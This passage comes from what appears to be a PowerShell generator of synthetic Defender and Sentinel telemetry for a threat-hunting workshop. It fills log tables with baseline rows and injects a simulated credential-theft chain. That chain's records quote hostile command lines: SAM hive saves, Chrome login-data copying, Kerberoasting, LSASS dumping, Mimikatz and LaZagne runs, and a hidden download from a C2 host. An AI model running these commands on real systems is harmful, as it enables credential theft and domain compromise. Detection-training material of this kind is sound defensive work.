        DeviceName = $device.Name
        PublicIP = $device.PublicIP
        LocalIP = $device.IP
        AccountDomain = $accountDomain
        AccountName = if ($isUbuntuDevice) { $linuxLocalUser } else { $user.Name }
        AccountSid = $user.Sid
        AccountUpn = $user.Upn
        AccountObjectId = $user.ObjectId
        AccountDisplayName = $user.DisplayName
        InitiatingProcessAccountDomain = $accountDomain
        InitiatingProcessAccountName = if ($isUbuntuDevice) { $linuxLocalUser } else { $user.Name }
        InitiatingProcessAccountSid = $user.Sid
        InitiatingProcessAccountUpn = $user.Upn
        InitiatingProcessAccountObjectId = $user.ObjectId
        InitiatingProcessIntegrityLevel = 'Medium'
        InitiatingProcessTokenElevation = 'TokenElevationTypeLimited'
        InitiatingProcessFileName = $process.File
        InitiatingProcessFolderPath = $processPath
        InitiatingProcessCommandLine = $processCommand
        InitiatingProcessParentFileName = $process.Parent
        InitiatingProcessSHA1 = $processHashes.SHA1
        InitiatingProcessSHA256 = $processHashes.SHA256
        InitiatingProcessMD5 = $processHashes.MD5
        SHA1 = $hashes.SHA1
        SHA256 = $hashes.SHA256
        MD5 = $hashes.MD5
        FileName = $file.Name
        FolderPath = $filePath
        FileSize = $file.Size
        AADTenantId = $tenantId
        TenantId = $tenantId
        ReportId = $reportId
        Type = $Table
        AdditionalFields = @{ Workload = 'WorkshopNormal'; Baseline = $true; OSProfile = if ($isUbuntuDevice) { 'Ubuntu' } else { 'Windows' } }
    }

    switch ($Table) {
        'DeviceProcessEvents' {
            $values.ActionType = 'ProcessCreated'
            $values.FileName = $process.File
            $values.FolderPath = $processPath
            $values.ProcessCommandLine = $processCommand
            $values.ProcessCreationTime = $timeText
            $values.ProcessId = 2000 + ($Index % 40000)
            $values.ProcessIntegrityLevel = if ($isUbuntuDevice) { 'Unknown' } else { 'Medium' }
            $values.ProcessTokenElevation = if ($isUbuntuDevice) { 'None' } else { 'TokenElevationTypeLimited' }
        }
        'DeviceFileEvents' {
            $values.ActionType = Get-WorkshopRandomItem @('FileCreated', 'FileModified', 'FileRenamed', 'FileDeleted')
        }
        'DeviceImageLoadEvents' {
            $values.ActionType = 'ImageLoaded'
            $values.FileName = $dll.Name
            $values.FolderPath = $dll.Path
            $values.FileSize = $dll.Size
            $dllHashes = New-WorkshopHashSet "$Table|$Index|$($dll.Name)"
            $values.SHA1 = $dllHashes.SHA1
            $values.SHA256 = $dllHashes.SHA256
            $values.MD5 = $dllHashes.MD5
        }
        'DeviceEvents' {
            $values.ActionType = if ($isUbuntuDevice) {
                Get-WorkshopRandomItem @('AuditdProcessExecution', 'SshSessionStarted', 'SudoCommand', 'PackageInstalled', 'ServiceStarted', 'AntivirusSignatureUpdated')
            }
            else {
                Get-WorkshopRandomItem @('ScheduledTaskCreated', 'ScheduledTaskDeleted', 'ServiceInstalled', 'AntivirusSignatureUpdated', 'PowerShellCommand', 'AppControlCodeIntegrityPolicyAudited')
            }
            $values.FileName = $process.File
            $values.FolderPath = $processPath
            $values.ProcessCommandLine = $processCommand
        }
        'DeviceNetworkEvents' {
            $values.ActionType = 'ConnectionSuccess'
            $values.RemoteUrl = $remote.Url
            $values.RemoteIP = $remote.IP
            $values.RemotePort = $remote.Port
            $values.LocalPort = 49152 + ($Index % 12000)
            $values.Protocol = if ($remote.PSObject.Properties['Protocol']) { $remote.Protocol } else { 'Tcp' }
        }
        'DeviceLogonEvents' {
            $values.ActionType = if (($Index % 17) -eq 0) { 'LogonFailed' } else { 'LogonSuccess' }
            $values.LogonType = if ($isUbuntuDevice) { Get-WorkshopRandomItem @('Ssh', 'Local', 'Sudo') } else { Get-WorkshopRandomItem @('Interactive', 'Network', 'RemoteInteractive', 'CachedInteractive') }
            $values.Protocol = if ($isUbuntuDevice) { if ($values.LogonType -eq 'Ssh') { 'Ssh' } else { 'PAM' } } else { Get-WorkshopRandomItem @('Kerberos', 'NTLM', 'Negotiate') }
            $values.IsLocalAdmin = if ($isUbuntuDevice) { $values.LogonType -eq 'Sudo' -or $user.Name -like 'svc_*' } else { ($user.Name -like 'svc_*' -or $device.Type -in @('DomainController', 'EntraConnect')) }
            $values.LogonId = 800000 + $Index
            $values.RemoteDeviceName = if ($isUbuntuDevice) { 'ADMIN-JUMP01.usag-cyber.local' } else { (Get-WorkshopRandomItem $devices).Name }
            $values.RemoteIP = if ($isUbuntuDevice) { '10.42.30.10' } else { (Get-WorkshopRandomItem $devices).IP }
        }
        'DeviceRegistryEvents' {
            $values.ActionType = Get-WorkshopRandomItem @('RegistryValueSet', 'RegistryKeyCreated', 'RegistryValueDeleted')
            $values.RegistryKey = Get-WorkshopRandomItem @('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense', 'HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Common')
            $values.RegistryValueName = Get-WorkshopRandomItem @('TelemetryLevel', 'LastSyncTime', 'UpdateChannel')
            $values.RegistryValueData = Get-WorkshopRandomItem @('Enabled', 'Current', 'MonthlyEnterprise')
            $values.RegistryValueType = 'REG_SZ'
        }
        'DeviceInfo' {
            $values.OSPlatform = $device.OS
            $values.OSBuild = if ($device.OS -eq 'Windows11') { '25H2' } elseif ($device.OS -like 'Windows*') { '26100' } else { '24.04' }
            $values.OSDistribution = if ($device.OS -eq 'Ubuntu') { 'Ubuntu' } else { '' }
            $values.IsAzureADJoined = -not $isUbuntuDevice
            $values.JoinType = if ($isUbuntuDevice) { '' } else { 'Hybrid Azure AD joined' }
            $values.AadDeviceId = New-StableGuid $device.DeviceId
            $values.LoggedOnUsers = @(@{ UserName = if ($isUbuntuDevice) { $linuxLocalUser } else { $user.Name }; DomainName = $accountDomain })
            $values.MachineGroup = if ($device.Type -eq 'DomainController') { 'Domain Controllers' } elseif ($device.Type -eq 'EntraConnect') { 'Identity Tier 0' } elseif ($isUbuntuDevice) { 'Linux Servers' } else { 'Workstations' }
            $values.OnboardingStatus = 'Onboarded'
            $values.DeviceType = $device.Type
            $values.SensorHealthState = 'Active'
            $values.ExposureLevel = if ($device.AssetValue -eq 'High') { 'Medium' } else { 'Low' }
            $values.AssetValue = $device.AssetValue
            $values.ConnectivityType = 'Corporate'
        }
        'DeviceNetworkInfo' {
            $values.NetworkAdapterName = if ($isUbuntuDevice) { Get-WorkshopRandomItem @('ens160', 'eth0') } else { 'Ethernet0' }
            $values.ConnectedNetworks = if ($isUbuntuDevice) { @(@{ Name = 'CorpLinux'; Category = 'Private' }) } else { @(@{ Name = 'CorpNet'; Category = 'DomainAuthenticated' }) }
            $values.IPAddresses = @($device.IP)
            $values.MacAddress = if ($isUbuntuDevice) { ('00:15:5d:{0:x2}:{1:x2}:{2:x2}' -f ($Index % 255), (($Index + 42) % 255), (($Index + 99) % 255)) } else { ('00-15-5D-{0:X2}-{1:X2}-{2:X2}' -f ($Index % 255), (($Index + 42) % 255), (($Index + 99) % 255)) }
        }
        { $_ -in @('SigninLogs', 'AADNonInteractiveUserSignInLogs', 'AADManagedIdentitySignInLogs', 'AADServicePrincipalSignInLogs', 'EntraIdSignInEvents', 'AADSignInEventsBeta', 'AADSpnSignInEventsBeta', 'EntraIdSpnSignInEvents') } {
            $values.Application = $app.Name
            $values.ApplicationId = $app.Id
            $values.AppDisplayName = $app.Name
            $values.AppId = $app.Id
            $values.ResourceDisplayName = $app.Resource
            $values.UserPrincipalName = $user.Upn
            $values.UserDisplayName = $user.DisplayName
            $values.UserId = $user.ObjectId
            $values.Identity = $user.DisplayName
            $values.IPAddress = Get-WorkshopRandomItem @('198.51.100.50', '198.51.100.60', '203.0.113.25', '192.0.2.44')
            $values.Country = 'DE'
            $values.State = 'Hesse'
            $values.City = 'Wiesbaden'
            $values.Location = 'DE'
            $values.ResultType = '0'
            $values.ResultDescription = 'Success'
            $values.ErrorCode = 0
            $values.IsInteractive = $Table -notlike '*NonInteractive*'
            $values.IsRisky = $false
            $values.RiskLevel = 'none'
            $values.RiskLevelDuringSignIn = 'none'
            $values.RiskState = 'none'
            $values.ConditionalAccessStatus = 'success'
            $values.AuthenticationRequirement = if (($Index % 4) -eq 0) { 'multiFactorAuthentication' } else { 'singleFactorAuthentication' }
            $values.AuthenticationMethodsUsed = if (($Index % 4) -eq 0) { 'Password,Authenticator App' } else { 'Password' }
            $values.ClientAppUsed = Get-WorkshopRandomItem @('Browser', 'Mobile Apps and Desktop clients', 'Exchange ActiveSync')
            $values.UserAgent = if ($isUbuntuDevice) { Get-WorkshopRandomItem @('Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36', 'curl/8.5.0', 'Microsoft-MDATP/101.25042.0000') } else { Get-WorkshopRandomItem @('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Microsoft Office/16.0', 'Teams/24215.1007.3082.1590') }
            $values.CorrelationId = New-StableGuid "$Table|signin-correlation|$Index"
            $values.Id = New-StableGuid "$Table|signin|$Index"
            $values.Status = @{ errorCode = 0; failureReason = 'Other'; additionalDetails = 'MFA requirement satisfied' }
            $values.DeviceDetail = @{ operatingSystem = if ($device.OS -eq 'Ubuntu') { 'Linux' } else { 'Windows' }; browser = 'Edge'; isCompliant = $true; trustType = 'Hybrid Azure AD joined' }
        }
        'CloudAppEvents' {
            $values.ActionType = Get-WorkshopRandomItem @('FileDownloaded', 'FileUploaded', 'UserLoggedIn', 'MailItemsAccessed', 'OAuthAppConsent')
            $values.Application = Get-WorkshopRandomItem @('Microsoft 365', 'Microsoft Teams', 'SharePoint Online', 'Exchange Online')
            $values.IPAddress = Get-WorkshopRandomItem @('198.51.100.50', '198.51.100.60', '203.0.113.25')
            $values.AccountId = $user.Upn
            $values.AccountType = 'Regular'
            $values.ObjectName = Get-WorkshopRandomItem @('QuarterlyPlanning.docx', 'Team Chat', 'Inbox', 'Operations Notebook')
            $values.ObjectType = Get-WorkshopRandomItem @('File', 'Message', 'MailItem', 'OAuthApplication')
            $values.ActivityType = $values.ActionType
            $values.RawEventData = @{ baseline = $true; workload = $values.Application }
        }
        'AuditLogs' {
            $values.ActivityDisplayName = Get-WorkshopRandomItem @('Update user', 'Add member to group', 'Update application', 'User registered security info')
            $values.OperationName = $values.ActivityDisplayName
            $values.Category = Get-WorkshopRandomItem @('UserManagement', 'GroupManagement', 'ApplicationManagement', 'AuthenticationMethods')
            $values.Result = 'success'
            $values.ResultType = 'Success'
            $values.Identity = $user.Upn
            $values.InitiatedBy = @{ user = @{ userPrincipalName = $user.Upn; id = $user.ObjectId; ipAddress = '198.51.100.50' } }
            $values.TargetResources = @(@{ displayName = $user.DisplayName; type = 'User'; id = $user.ObjectId })
            $values.LoggedByService = 'Core Directory'
            $values.Id = New-StableGuid "$Table|audit|$Index"
        }
        { $_ -in @('GraphApiAuditEvents', 'MicrosoftGraphActivityLogs') } {
            $values.ApplicationId = $app.Id
            $values.AppId = $app.Id
            $values.IPAddress = Get-WorkshopRandomItem @('198.51.100.50', '198.51.100.60', '203.0.113.25')
            $values.RequestMethod = Get-WorkshopRandomItem @('GET', 'POST', 'PATCH')
            $values.RequestUri = Get-WorkshopRandomItem @('/v1.0/me', '/v1.0/users', '/v1.0/me/messages', '/v1.0/sites/root/drive/root/children')
            $values.ResponseStatusCode = if (($Index % 31) -eq 0) { 429 } else { 200 }
            $values.UserId = $user.ObjectId
            $values.AccountObjectId = $user.ObjectId
            $values.ServicePrincipalId = New-StableGuid "$($app.Id)|sp"
            $values.UniqueTokenIdentifier = New-StableGuid "$Table|token|$Index"
            $values.UniqueTokenId = $values.UniqueTokenIdentifier
            $values.TargetWorkload = 'MicrosoftGraph'
            $values.ResponseSize = Get-WorkshopRandomInt -Minimum 512 -Maximum 65536
            $values.RequestDuration = Get-WorkshopRandomInt -Minimum 20 -Maximum 1200
        }
        { $_ -in @('AlertInfo', 'AlertEvidence') } {
            $alertId = "BASE-$('{0:D6}' -f $Index)"
            $values.AlertId = $alertId
            $values.Title = Get-WorkshopRandomItem @('Informational Defender sensor event', 'Suspicious but remediated sign-in', 'Low severity malware blocked', 'Cloud app policy match')
            $values.Category = Get-WorkshopRandomItem @('InitialAccess', 'Execution', 'DefenseEvasion', 'Discovery')
            $values.Severity = Get-WorkshopRandomItem @('Informational', 'Low', 'Low', 'Medium')
            $values.ServiceSource = Get-WorkshopRandomItem @('Microsoft Defender for Endpoint', 'Microsoft Defender for Identity', 'Microsoft Defender for Cloud Apps')
            $values.DetectionSource = 'AutomatedInvestigation'
            $values.EntityType = Get-WorkshopRandomItem @('Device', 'User', 'File', 'Process')
            $values.EvidenceRole = 'Related'
            $values.EvidenceDirection = 'Source'
            $values.AttackTechniques = ''
            $values.Categories = @($values.Category)
        }
        { $_ -like 'Identity*' } {
            $values.ActionType = Get-WorkshopRandomItem @('LogonSuccess', 'LdapSearch', 'AccountModified', 'GroupMembershipChanged', 'IdentitySnapshot')
            $values.Application = Get-WorkshopRandomItem @('Active Directory', 'Kerberos', 'LDAP', 'Microsoft Entra Connect')
            $values.Protocol = Get-WorkshopRandomItem @('Kerberos', 'LDAP', 'NTLM')
            $values.QueryType = 'Search'
            $values.QueryTarget = Get-WorkshopRandomItem @('user', 'group', 'servicePrincipalName')
            $values.Query = '(objectClass=user)'
            $values.IPAddress = $device.IP
            $values.DestinationDeviceName = (Get-WorkshopRandomItem $domainControllers).Name
            $values.DestinationIPAddress = (Get-WorkshopRandomItem $domainControllers).IP
            $values.DestinationPort = Get-WorkshopRandomItem @(88, 389, 636)
            $values.AccountObjectId = $user.ObjectId
            $values.AccountUpn = $user.Upn
            $values.AccountDisplayName = $user.DisplayName
            $values.OnPremSid = $user.Sid
            $values.IsAccountEnabled = $true
            $values.CriticalityLevel = if ($user.Name -like 'svc_*') { 2 } else { 1 }
            $values.BlastRadius = if ($user.Name -like 'svc_*') { 'High' } else { 'Low' }
            $values.Tags = if ($user.Name -like 'svc_*') { @('ServiceAccount') } else { @('Employee') }
            $values.SourceProviders = @('ActiveDirectory', 'EntraID')
            $values.GroupMembership = @('Domain Users')
        }
        { $_ -like 'DeviceTvm*' -or $_ -like 'DeviceBaseline*' } {
            $values.ActionType = 'InventorySnapshot'
            $values.OSPlatform = if ($isUbuntuDevice) { 'Ubuntu' } else { $device.OS }
            $values.OSVersion = if ($isUbuntuDevice) { '24.04 LTS' } elseif ($device.OS -eq 'Windows11') { '25H2' } else { 'Server 2025' }
            $values.OSArchitecture = 'x64'
            if ($isUbuntuDevice) {
                $software = Get-WorkshopRandomItem $linuxSoftwareCatalog
                $values.SoftwareName = $software.Name
                $values.SoftwareVendor = $software.Vendor
                $values.SoftwareVersion = $software.Version
                $values.CveId = $software.CveId
                $values.PackageName = $software.Package
                $values.VulnerabilitySeverityLevel = if ($software.Risk -ge 80) { 'High' } elseif ($software.Risk -ge 60) { 'Medium' } else { 'Low' }
                $values.RecommendedSecurityUpdate = if ($software.CveId) { "Update Ubuntu package $($software.Package)" } else { 'No security update required' }
                $values.CveTags = if ($software.CveId) { @('Linux', 'Ubuntu') } else { @('Inventory') }
                $values.AdditionalFields = @{ OSProfile = 'Ubuntu'; Package = $software.Package; CveId = $software.CveId }
            }
            else {
                $values.SoftwareName = Get-WorkshopRandomItem @('Microsoft Edge', 'Microsoft Teams', 'OpenSSL', 'Microsoft Defender for Endpoint')
                $values.SoftwareVendor = Get-WorkshopRandomItem @('Microsoft', 'Canonical', 'OpenSSL Software Foundation')
                $values.SoftwareVersion = Get-WorkshopRandomItem @('125.0.2535.67', '1.1.1w', '24215.1007.3082.1590', '4.18.24040.4')
                $values.CveId = Get-WorkshopRandomItem @('CVE-2024-21338', 'CVE-2024-30078', 'CVE-2023-48795')
            }
            $values.ConfigurationId = New-StableGuid "$Table|config|$Index"
            $values.IsCompliant = ($Index % 7) -ne 0
            $values.ComplianceStatus = if ($values.IsCompliant) { 'Compliant' } else { 'NonCompliant' }
            $values.RiskScore = if ($isUbuntuDevice -and $software) { $software.Risk } else { Get-WorkshopRandomInt -Minimum 1 -Maximum 60 }
        }
        default {
            $values.ActionType = 'WorkshopNormalBaseline'
            $values.Application = 'WorkshopNormalBaseline'
        }
    }

    return $values
}

function Get-WorkshopTargetRowCount {
    param([Parameter(Mandatory)][string]$Table)

    $existingCount = $script:Records[$Table].Count
    if ($NormalRowsPerTable -eq 0) {
        return $existingCount
    }
    if ($NormalRowsPerTable -lt 0 -and $NormalMinRowsPerTable -gt $NormalMaxRowsPerTable) {
        throw 'NormalMinRowsPerTable cannot be greater than NormalMaxRowsPerTable.'
    }

    $targetRows = if ($NormalRowsPerTable -gt 0) {
        $NormalRowsPerTable
    }
    else {
        Get-WorkshopRandomInt -Minimum $NormalMinRowsPerTable -Maximum ($NormalMaxRowsPerTable + 1)
    }

    return [Math]::Max($existingCount, $targetRows)
}

function Write-WorkshopTableData {
    param([Parameter(Mandatory)][string]$Table)

    $path = Join-Path $OutputDirectory "$Table.json"
    $targetRows = Get-WorkshopTargetRowCount -Table $Table
    $existingCount = $script:Records[$Table].Count
    $rowsToAdd = [Math]::Max(0, $targetRows - $existingCount)
    $tableSeed = [Convert]::ToInt32((New-StableHex $Table 7), 16)
    $encoding = [System.Text.UTF8Encoding]::new($false)
    $writer = [System.IO.StreamWriter]::new($path, $false, $encoding)
    $written = 0

    try {
        foreach ($record in $script:Records[$Table]) {
            $writer.WriteLine(($record | ConvertTo-Json -Compress -Depth 20))
            $written++
        }

        for ($i = 0; $i -lt $rowsToAdd; $i++) {
            $time = New-WorkshopNormalTime
            $index = $tableSeed + $i
            $values = New-NormalTelemetryValues -Table $Table -Time $time -Index $index
            $record = New-WorkshopRecordObject -Table $Table -Values $values -Time $time
            if ($null -ne $record) {
                $writer.WriteLine(($record | ConvertTo-Json -Compress -Depth 20))
                $written++
            }
        }
    }
    finally {
        $writer.Dispose()
    }

    Write-Host "Wrote $written row(s) to $path"
}

$stage = 'C:\ProgramData\wrstage'
$attackSteps = @(
    [pscustomobject]@{ Offset = 15; File = 'powershell.exe'; Path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; Command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $stage\collect-reg-creds.ps1"; Parent = 'explorer.exe'; Technique = 'T1552.002'; Title = 'Credentials in Registry Script'; Pid = 4101 },
    [pscustomobject]@{ Offset = 22; File = 'reg.exe'; Path = 'C:\Windows\System32\reg.exe'; Command = "reg.exe save HKLM\SAM $stage\sam.save /y"; Parent = 'cmd.exe'; Technique = 'T1003.002'; Title = 'Dump SAM Registry Hive via reg save Command'; Pid = 4102 },
    [pscustomobject]@{ Offset = 27; File = 'esentutl.exe'; Path = 'C:\Windows\System32\esentutl.exe'; Command = "esentutl.exe /y `"C:\Users\$($victor.Name)\AppData\Local\Google\Chrome\User Data\Default\Login Data`" /d $stage\LoginData.db"; Parent = 'powershell.exe'; Technique = 'T1555.003'; Title = 'Collect Browser Data via Esentutl using PowerShell Script'; Pid = 4103 },
    [pscustomobject]@{ Offset = 35; File = "$toolRu.exe"; Path = "$stage\$toolRu.exe"; Command = "$toolRu.exe kerberoast /ldapfilter:`"(servicePrincipalName=*)`" /nowrap /outfile:$stage\roast.txt"; Parent = 'powershell.exe'; Technique = 'T1558.003'; Title = "Kerberoasting using $toolRu"; Pid = 4104 },
    [pscustomobject]@{ Offset = 42; File = 'powershell.exe'; Path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; Command = "powershell.exe -NoProfile -ExecutionPolicy Bypass Import-Module .\PowerView.ps1; $kerbCmd -OutputFormat Hashcat"; Parent = 'powershell.exe'; Technique = 'T1558.003'; Title = "Kerberoasting using PowerShell Empire's $kerbCmd Script"; Pid = 4105 },
    [pscustomobject]@{ Offset = 50; File = "$toolProc.exe"; Path = "$stage\$toolProc.exe"; Command = "$toolProc.exe -accepteula -ma $targetLsLower.exe $stage\$targetLsLower.dmp"; Parent = 'cmd.exe'; Technique = 'T1003.001'; Title = "Dump $targetLs Process to Minidump File"; Pid = 4106 },
    [pscustomobject]@{ Offset = 56; File = "$toolPw.exe"; Path = "$stage\$toolPw.exe"; Command = "$toolPw.exe -o $stage\pwdump7.txt"; Parent = 'cmd.exe'; Technique = 'T1003.002'; Title = "Dump Passwords using $toolPw"; Pid = 4107 },
    [pscustomobject]@{ Offset = 60; File = "$toolGs.exe"; Path = "$stage\$toolGs.exe"; Command = "$toolGs.exe -a > $stage\gsecdump.txt"; Parent = 'cmd.exe'; Technique = 'T1003.001'; Title = "Dump Passwords using $toolGs"; Pid = 4108 },
    [pscustomobject]@{ Offset = 65; File = "$toolLa.exe"; Path = "$stage\$toolLa.exe"; Command = "$toolLa.exe all -oN -output $stage\lazagne"; Parent = 'cmd.exe'; Technique = 'T1555'; Title = "Dump Passwords using $toolLa"; Pid = 4109 },
    [pscustomobject]@{ Offset = 70; File = 'rundll32.exe'; Path = 'C:\Windows\System32\rundll32.exe'; Command = "rundll32.exe $stage\$toolKiwi.dll,StartW /$secretVerb /exit"; Parent = 'powershell.exe'; Technique = 'T1003.001'; Title = "Dump Windows Passwords with Obfuscated $toolMi"; Pid = 4110 },
    [pscustomobject]@{ Offset = 73; File = "$($toolMi.ToLower()).exe"; Path = "$stage\$($toolMi.ToLower()).exe"; Command = "$($toolMi.ToLower()).exe `"$debugVerb`" `"$secretVerb`" `"exit`""; Parent = 'cmd.exe'; Technique = 'T1003.001'; Title = "Dump Windows Passwords with Original $toolMi"; Pid = 4111 }
)

foreach ($step in $attackSteps) {
    $time = $StartTime.AddMinutes($step.Offset)
    Add-ProcessEvent -Time $time -FileName $step.File -FolderPath $step.Path -CommandLine $step.Command -Parent $step.Parent -Technique $step.Technique -ProcessId $step.Pid
    Add-Record -Table 'DeviceEvents' -Time $time -Values @{
        Timestamp = Format-WorkshopTime $time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'AntivirusSignatureDetected'
        FileName = $step.File
        FolderPath = $step.Path
        AccountDomain = $adDomain
        AccountName = $victor.Name
        AccountUpn = $victor.Upn
        ProcessCommandLine = $step.Command
        InitiatingProcessFileName = $step.Parent
        ReportId = $step.Pid
        AdditionalFields = "{`"Technique`":`"$($step.Technique)`",`"AttackVector`":`"$($step.Title)`"}"
    }
}

Add-Record -Table 'DeviceRegistryEvents' -Time $StartTime.AddMinutes(16) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(16)
    DeviceId = $win04.DeviceId
    DeviceName = $win04.Name
    ActionType = 'RegistryValueCreated'
    RegistryKey = 'HKEY_CURRENT_USER\Software\USAGCyber\VPN'
    RegistryValueType = 'REG_SZ'
    RegistryValueName = 'SavedPassword'
    RegistryValueData = 'REDACTED_SYNTHETIC_SECRET'
    InitiatingProcessAccountDomain = $adDomain
    InitiatingProcessAccountName = $victor.Name
    InitiatingProcessAccountSid = $victor.Sid
    InitiatingProcessAccountUpn = $victor.Upn
    InitiatingProcessFileName = 'powershell.exe'
    InitiatingProcessCommandLine = 'collect-reg-creds.ps1'
    ReportId = 5101
}

Add-FileEvent -Time $StartTime.AddMinutes(23) -FileName 'sam.save' -FolderPath "$stage\sam.save" -ProcessName 'reg.exe' -ProcessCommandLine "reg.exe save HKLM\SAM $stage\sam.save /y" -ReportId 5201
Add-FileEvent -Time $StartTime.AddMinutes(24) -FileName 'system.save' -FolderPath "$stage\system.save" -ProcessName 'reg.exe' -ProcessCommandLine "reg.exe save HKLM\SYSTEM $stage\system.save /y" -ReportId 5202
Add-FileEvent -Time $StartTime.AddMinutes(28) -FileName 'LoginData.db' -FolderPath "$stage\LoginData.db" -ProcessName 'esentutl.exe' -ProcessCommandLine "esentutl.exe /y Chrome Login Data /d $stage\LoginData.db" -ReportId 5203
Add-FileEvent -Time $StartTime.AddMinutes(51) -FileName "$targetLsLower.dmp" -FolderPath "$stage\$targetLsLower.dmp" -ProcessName "$toolProc.exe" -ProcessCommandLine "$toolProc.exe -accepteula -ma $targetLsLower.exe $stage\$targetLsLower.dmp" -ReportId 5204
Add-FileEvent -Time $StartTime.AddMinutes(76) -FileName 'cred_bundle.zip' -FolderPath "$stage\cred_bundle.zip" -ProcessName 'powershell.exe' -ProcessCommandLine "Compress-Archive $stage\* $stage\cred_bundle.zip" -ReportId 5205

Add-NetworkEvent -Time $StartTime.AddMinutes(14) -RemoteIP $c2Ip -RemotePort 443 -RemoteUrl $c2Host -ProcessName 'powershell.exe' -CommandLine "powershell.exe -nop -w hidden iwr https://$c2Host/a.ps1" -ReportId 5301
Add-NetworkEvent -Time $StartTime.AddMinutes(36) -RemoteIP $dc01.IP -RemotePort 389 -RemoteUrl $dc01.Name -ProcessName "$toolRu.exe" -CommandLine "$toolRu.exe kerberoast /ldapfilter:`"(servicePrincipalName=*)`"" -ReportId 5302
Add-NetworkEvent -Time $StartTime.AddMinutes(37) -RemoteIP $dc01.IP -RemotePort 88 -RemoteUrl $dc01.Name -ProcessName "$toolRu.exe" -CommandLine "$toolRu.exe kerberoast /nowrap" -ReportId 5303
Add-NetworkEvent -Time $StartTime.AddMinutes(80) -RemoteIP $aadc.IP -RemotePort 5985 -RemoteUrl $aadc.Name -ProcessName 'powershell.exe' -CommandLine "Enter-PSSession AADCONNECT01 -Credential $adDomain\$($svcSql.Name)" -ReportId 5304

Add-Record -Table 'DeviceLogonEvents' -Time $StartTime.AddMinutes(12) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(12)
    DeviceId = $win04.DeviceId
    DeviceName = $win04.Name
    ActionType = 'LogonSuccess'
    LogonType = 'Interactive'
    AccountDomain = $adDomain
    AccountName = $victor.Name
    AccountSid = $victor.Sid
    Protocol = 'Negotiate'
    IsLocalAdmin = $true
    LogonId = 9001
    RemoteIP = $externalIp
    ReportId = 5401
}
Add-Record -Table 'DeviceLogonEvents' -Time $StartTime.AddMinutes(81) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(81)
    DeviceId = $aadc.DeviceId
    DeviceName = $aadc.Name
    ActionType = 'LogonSuccess'
    LogonType = 'RemoteInteractive'
    AccountDomain = $adDomain
    AccountName = $svcSql.Name
    AccountSid = $svcSql.Sid
    Protocol = 'NTLM'
    IsLocalAdmin = $true
    LogonId = 9002
    RemoteDeviceName = $win04.Name
    RemoteIP = $win04.IP
    ReportId = 5402
}

foreach ($queryOffset in 35, 42) {
    Add-Record -Table 'IdentityQueryEvents' -Time $StartTime.AddMinutes($queryOffset) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes($queryOffset)
        ActionType = 'LdapSearch'
        Application = if ($queryOffset -eq 35) { $toolRu } else { 'PowerShell Empire' }
        QueryType = 'Search'
        QueryTarget = 'servicePrincipalName'
        Query = '(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
        Protocol = 'LDAP'
        AccountName = $victor.Name
        AccountDomain = $adDomain
        AccountUpn = $victor.Upn
        AccountSid = $victor.Sid
        AccountObjectId = $victor.ObjectId
        AccountDisplayName = $victor.DisplayName
        DeviceName = $win04.Name
        IPAddress = $win04.IP
        DestinationDeviceName = $dc01.Name
        DestinationIPAddress = $dc01.IP
        DestinationPort = 389
        ReportId = 5500 + $queryOffset
        AdditionalFields = '{"Technique":"T1558.003","Result":"SPN accounts enumerated"}'
    }
}

Add-Record -Table 'IdentityLogonEvents' -Time $StartTime.AddMinutes(37) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(37)
    ActionType = 'LogonSuccess'
    Application = 'Kerberos'
    LogonType = 'Network'
    Protocol = 'Kerberos'
    AccountName = $victor.Name
    AccountDomain = $adDomain
    AccountUpn = $victor.Upn
    AccountSid = $victor.Sid
    AccountObjectId = $victor.ObjectId
    AccountDisplayName = $victor.DisplayName
    DeviceName = $win04.Name
    IPAddress = $win04.IP
    DestinationDeviceName = $dc01.Name
    DestinationIPAddress = $dc01.IP
    DestinationPort = 88
    TargetAccountDisplayName = $svcSql.DisplayName
    ReportId = 5601
    AdditionalFields = '{"ServicePrincipalName":"MSSQLSvc/sql01.usag-cyber.local:1433","TicketEncryptionType":"RC4_HMAC"}'
}
Add-Record -Table 'IdentityLogonEvents' -Time $StartTime.AddMinutes(81) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(81)
    ActionType = 'LogonSuccess'
    Application = 'WinRM'
    LogonType = 'RemoteInteractive'
    Protocol = 'NTLM'
    AccountName = $svcSql.Name
    AccountDomain = $adDomain
    AccountUpn = $svcSql.Upn
    AccountSid = $svcSql.Sid
    AccountObjectId = $svcSql.ObjectId
    AccountDisplayName = $svcSql.DisplayName
    DeviceName = $win04.Name
    IPAddress = $win04.IP
    DestinationDeviceName = $aadc.Name
    DestinationIPAddress = $aadc.IP
    DestinationPort = 5985
    ReportId = 5602
    AdditionalFields = '{"CredentialSource":"Kerberoasted service account"}'
}
Add-Record -Table 'IdentityDirectoryEvents' -Time $StartTime.AddMinutes(86) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(86)
    ActionType = 'AccountModified'
    Application = 'Active Directory'
    TargetAccountUpn = $svcSync.Upn
    TargetAccountDisplayName = $svcSync.DisplayName
    DestinationDeviceName = $dc01.Name
    DestinationIPAddress = $dc01.IP
    DestinationPort = 389
    Protocol = 'LDAP'
    AccountName = $svcSql.Name
    AccountDomain = $adDomain
    AccountUpn = $svcSql.Upn
    AccountSid = $svcSql.Sid
    AccountObjectId = $svcSql.ObjectId
    AccountDisplayName = $svcSql.DisplayName
    DeviceName = $aadc.Name
    IPAddress = $aadc.IP
    ReportId = 5701
    AdditionalFields = '{"Change":"Service account delegation settings read","Tier":"0"}'
}

$signinTime = $StartTime
$signinCommon = @{
